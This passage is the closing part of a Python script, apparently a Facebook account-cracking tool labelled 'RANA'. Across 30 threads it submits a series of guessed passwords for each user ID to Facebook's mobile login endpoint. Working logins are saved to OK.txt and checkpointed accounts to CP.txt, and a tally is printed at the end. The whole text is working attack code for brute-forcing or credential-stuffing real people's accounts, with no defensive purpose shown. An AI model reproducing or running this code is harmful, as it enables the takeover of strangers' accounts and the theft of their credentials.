				else:
					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps2, 'login': 'submit'})
					sp = data.content
					if 'mbasic_logout_button' in sp or 'save-device' in sp:
						print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps2+'\033[0;97m')
						ok = open('OK.txt', 'a')
						ok.write(uid+'|'+ps2+'\n')
						ok.close()
						oks.append(uid+ps2)
					else:
						if 'checkpoint' in sp:
							print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps2+'\033[0;97m')
							cp = open('CP.txt', 'a')
							cp.write(uid+'|'+ps2+'\n')
							cp.close()
							cps.append(uid+ps2)
						else:
							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps3, 'login': 'submit'})
							sp = data.content
							if 'mbasic_logout_button' in sp or 'save-device' in sp:
								print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps3+'\033[0;97m')
								ok = open('OK.txt', 'a')
								ok.write(uid+'|'+ps3+'\n')
								ok.close()
								oks.append(uid+ps3)
							else:
								if 'checkpoint' in sp:
									print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps3+'\033[0;97m')
									cp = open('CP.txt', 'a')
									cp.write(uid+'|'+ps3+'\n')
									cp.close()
									cps.append(uid+ps3)
								else:
									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps4, 'login': 'submit'})
									sp = data.content
									if 'mbasic_logout_button' in sp or 'save-device' in sp:
										print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps4+'\033[0;97m')
										ok = open('OK.txt', 'a')
										ok.write(uid+'|'+ps4+'\n')
										ok.close()
										oks.append(uid+ps4)
									else:
										if 'checkpoint' in sp:
											print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps4+'\033[0;97m')
											cp = open('CP.txt', 'a')
											cp.write(uid+'|'+ps4+'\n')
											cp.close()
											cps.append(uid+ps4)
										else:
											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps5, 'login': 'submit'})
											sp = data.content
											if 'mbasic_logout_button' in sp or 'save-device' in sp:
												print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps5+'\033[0;97m')
												ok = open('OK.txt', 'a')
												ok.write(uid+'|'+ps5+'\n')
												ok.close()
												oks.append(uid+ps5)
											else:
												if 'checkpoint' in sp:
													print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps5+'\033[0;97m')
													cp = open('CP.txt', 'a')
													cp.write(uid+'|'+ps5+'\n')
													cp.close()
													cps.append(uid+ps5)
												else:
													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps6, 'login': 'submit'})
													sp = data.content
													if 'mbasic_logout_button' in sp or 'save-device' in sp:
														print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps6+'\033[0;97m')
														ok = open('OK.txt', 'a')
														ok.write(uid+'|'+ps6+'\n')
														ok.close()
														oks.append(uid+ps6)
													else:
														if 'checkpoint' in sp:
															print(' \033[1;97m [RANA-CP] '+uid+' | '+ps6+'\033[0;97m')
															cp = open('CP.txt', 'a')
															cp.write(uid+'|'+ps6+'\n')
															cp.close()
															cps.append(uid+ps6)
														else:
															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps7, 'login': 'submit'})
															sp = data.content
															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps7+'\033[0;97m')
																ok = open('OK.txt', 'a')
																ok.write(uid+'|'+ps7+'\n')
																ok.close()
																oks.append(uid+ps7)
															else:
																if 'checkpoint' in sp:
																	print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps7+'\033[0;97m')
																	cp = open('CP.txt', 'a')
																	cp.write(uid+'|'+ps7+'\n')
																	cp.close()
																	cps.append(uid+ps7)
																else:
																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps8, 'login': 'submit'})
																	sp = data.content
																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																		print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps8+'\033[0;97m')
																		ok = open('OK.txt', 'a')
																		ok.write(uid+'|'+ps8+'\n')
																		ok.close()
																		oks.append(uid+ps8)
																	else:
																		if 'checkpoint' in sp:
																			print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps8+'\033[0;97m')
																			cp = open('CP.txt', 'a')
																			cp.write(uid+'|'+ps8+'\n')
																			cp.close()
																			cps.append(uid+ps8)
																		else:
																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps9, 'login': 'submit'})
																			sp = data.content
																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																				print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps9+'\033[0;97m')
																				ok = open('OK.txt', 'a')
																				ok.write(uid+'|'+ps9+'\n')
																				ok.close()
																				oks.append(uid+ps9)
																			else:
																				if 'checkpoint' in sp:
																					print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps9+'\033[0;97m')
																					cp = open('CP.txt', 'a')
																					cp.write(uid+'|'+ps9+'\n')
																					cp.close()
																					cps.append(uid+ps9)
																				else:
																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps10, 'login': 'submit'})
																					sp = data.content
																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																						print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps10+'\033[0;97m')
																						ok = open('OK.txt', 'a')
																						ok.write(uid+'|'+ps10+'\n')
																						ok.close()
																						oks.append(uid+ps10)
																					else:
																						if 'checkpoint' in sp:
																							print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps10+'\033[0;97m')
																							cp = open('CP.txt', 'a')
																							cp.write(uid+'|'+ps10+'\n')
																							cp.close()
																							cps.append(uid+ps10)
																						else:
																							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps11, 'login': 'submit'})
																							sp = data.content
																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																								print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps11+'\033[0;97m')
																								ok = open('OK.txt', 'a')
																								ok.write(uid+'|'+ps11+'\n')
																								ok.close()
																								oks.append(uid+ps11)
																							else:
																								if 'checkpoint' in sp:
																									print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps11+'\033[0;97m')
																									cp = open('CP.txt', 'a')
																									cp.write(uid+'|'+ps11+'\n')
																									cp.close()
																									cps.append(uid+ps11)
																								else:
																									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps12, 'login': 'submit'})
																									sp = data.content
																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																										print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps12+'\033[0;97m')
																										ok = open('OK.txt', 'a')
																										ok.write(uid+'|'+ps12+'\n')
																										ok.close()
																										oks.append(uid+ps12)
																									else:
																										if 'checkpoint' in sp:
																											print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps12+'\033[0;97m')
																											cp = open('CP.txt', 'a')
																											cp.write(uid+'|'+ps12+'\n')
																											cp.close()
																											cps.append(uid+ps12)
																										else:
																											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps13, 'login': 'submit'})
																											sp = data.content
																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																												print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps13+'\033[0;97m')
																												ok = open('OK.txt', 'a')
																												ok.write(uid+'|'+ps13+'\n')
																												ok.close()
																												oks.append(uid+ps13)
																											else:
																												if 'checkpoint' in sp:
																													print(' \033[1;97m [RANA-CP] '+uid+' | '+ps13+'\033[0;97m')
																													cp = open('CP.txt', 'a')
																													cp.write(uid+'|'+ps13+'\n')
																													cp.close()
																													cps.append(uid+ps13)
																												else:
																													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps14, 'login': 'submit'})
																													sp = data.content
																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																														print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps14+'\033[0;97m')
																														ok = open('OK.txt', 'a')
																														ok.write(uid+'|'+ps14+'\n')
																														ok.close()
																														oks.append(uid+ps14)
																													else:
																														if 'checkpoint' in sp:
																															print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps14+'\033[0;97m')
																															cp = open('CP.txt', 'a')
																															cp.write(uid+'|'+ps14+'\n')
																															cp.close()
																															cps.append(uid+ps14)
																														else:
																															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps15, 'login': 'submit'})
																															sp = data.content
																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps15+'\033[0;97m')
																																ok = open('OK.txt', 'a')
																																ok.write(uid+'|'+ps15+'\n')
																																ok.close()
																																oks.append(uid+ps15)
																															else:
																																if 'checkpoint' in sp:
																																	print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps15+'\033[0;97m')
																																	cp = open('CP.txt', 'a')
																																	cp.write(uid+'|'+ps15+'\n')
																																	cp.close()
																																	cps.append(uid+ps15)
																																else:
																																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps16, 'login': 'submit'})
																																	sp = data.content
																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																		print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps16+'\033[0;97m')
																																		ok = open('OK.txt', 'a')
																																		ok.write(uid+'|'+ps16+'\n')
																																		ok.close()
																																		oks.append(uid+ps16)
																																	else:
																																		if 'checkpoint' in sp:
																																			print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps16+'\033[0;97m')
																																			cp = open('CP.txt', 'a')
																																			cp.write(uid+'|'+ps16+'\n')
																																			cp.close()
																																			cps.append(uid+ps16)
																																		else:
																																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps17, 'login': 'submit'})
																																			sp = data.content
																																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																				print(' \x1b[1;92m [RANA-OK] '+uid+' | '+ps17+'\033[0;97m')
																																				ok = open('OK.txt', 'a')
																																				ok.write(uid+'|'+ps17+'\n')
																																				ok.close()
																																				oks.append(uid+ps17)
																																			else:
																																				if 'checkpoint' in sp:
																																					print(' \x1b[1;97m [RANA-CP] '+uid+' | '+ps17+'\033[0;97m')
																																					cp = open('CP.txt', 'a')
																																					cp.write(uid+'|'+ps17+'\n')
																																					cp.close()
																																					cps.append(uid+ps17)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\x1b[1;97m------------------------------------------------")
	print ("\x1b[1;91m[!]\x1b[1;97mProcess has been complete")
	print ("\x1b[1;91m[!]\x1b[1;97mTotal OK  "+str(len(oks)))
	print ("\x1b[1;91m[!]\x1b[1;97mTotal CP  "+str(len(cps)))
	print("\x1b[1;97m-------------------------------------------------")
	raw_input("\x1b[1;91m[!]\x1b[1;97mPress enter to back  Menu ")
	menu()
        
	
if __name__ == '__main__':
	sb()
